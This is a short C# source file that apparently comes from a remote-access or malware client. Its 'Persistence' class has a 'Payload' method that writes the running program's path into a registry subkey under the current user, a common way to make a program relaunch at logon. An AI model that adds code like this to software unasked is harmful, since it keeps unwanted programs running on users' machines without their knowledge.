using Microsoft.Win32;
using System.IO;

namespace Client.Utils
{
    internal class Persistence
    {
        internal void Payload(string _Sub_Key)
        {
            Registry.CurrentUser.CreateSubKey(_Sub_Key).SetValue(Path.GetFileName(SysInfo.Application), SysInfo.Application);
        }
    }
}